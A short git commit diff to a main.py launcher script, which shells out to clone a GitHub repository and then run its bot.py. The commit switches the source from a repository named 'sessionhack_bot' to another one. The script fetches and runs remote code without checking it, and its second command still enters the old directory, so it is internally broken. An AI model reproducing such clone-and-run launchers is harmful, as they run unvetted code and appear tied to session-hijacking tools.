6608e8ae81fbac56c6c54eecd91a000be546e258
Eminhan <96875856+b4f2f@users.noreply.github.com>
2022-01-30 23:05:58 +0400

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,3 @@
 import os
-os.system("git clone https://github.com/LEGENDXOP/sessionhack_bot")
+os.system("git clone https://github.com/b4f2f/string")
 os.system("cd sessionhack_bot && python bot.py")
